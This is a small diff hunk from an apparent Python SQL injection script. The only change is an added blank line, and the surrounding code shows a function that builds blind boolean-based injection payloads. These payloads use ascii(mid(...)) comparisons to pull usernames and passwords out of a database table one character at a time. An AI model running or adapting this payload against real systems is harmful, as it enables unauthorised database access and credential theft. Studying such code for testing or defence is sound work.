@@ -18,6 +18,7 @@ def sql_inject_payload(limit_len,str_len,ascii_str):
     table_columns = 'username,0x7e,password'
     select_content_sql_sequence = f"select concat({table_columns}) from {table_name}"
 
+
     # print(table_sql_sequence)
     poc = f'{pre_inject_str} or (ascii(mid(({schema_sql_sequence} limit {limit_len},1),{str_len},1))>{ascii_str}) {suf_inject_str}'
     return poc
